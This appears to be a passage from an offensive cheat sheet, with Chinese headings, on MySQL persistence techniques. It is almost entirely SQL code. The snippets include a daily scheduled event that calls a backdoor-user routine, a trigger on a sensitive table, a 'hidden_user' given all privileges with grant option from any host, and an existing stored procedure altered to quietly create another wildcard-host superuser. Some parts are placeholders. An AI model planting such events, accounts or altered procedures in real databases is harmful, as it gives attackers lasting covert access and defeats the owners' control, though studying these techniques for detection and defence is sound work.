## 持久化

### 创建事件调度程序作业

```sql
CREATE EVENT `event_persist`
ON SCHEDULE EVERY 1 DAY
DO
   BEGIN
     -- Payload
     CALL Create_Backdoor_User();
   END;
```

### 触发器

```sql
CREATE TRIGGER `trigger_persist`
AFTER INSERT ON `sensitive_table`
FOR EACH ROW
BEGIN
  -- Payload
  INSERT INTO `log_table` (`message`) VALUES ('Data Inserted');
END;
```

### 创建管理用户

```sql
CREATE USER 'hidden_user'@'%' IDENTIFIED BY 'strong_password';
GRANT ALL PRIVILEGES ON *.* TO 'hidden_user'@'%' WITH GRANT OPTION;
```

### 修改现有存储过程

```sql
DELIMITER //
CREATE PROCEDURE `legitimate_procedure` ()
BEGIN
   -- Existing code
   -- ...

   -- Malicious code
   CREATE USER 'extra_user'@'%' IDENTIFIED BY 'password';
   GRANT ALL PRIVILEGES ON *.* TO 'extra_user'@'%';
END//
DELIMITER ;
```
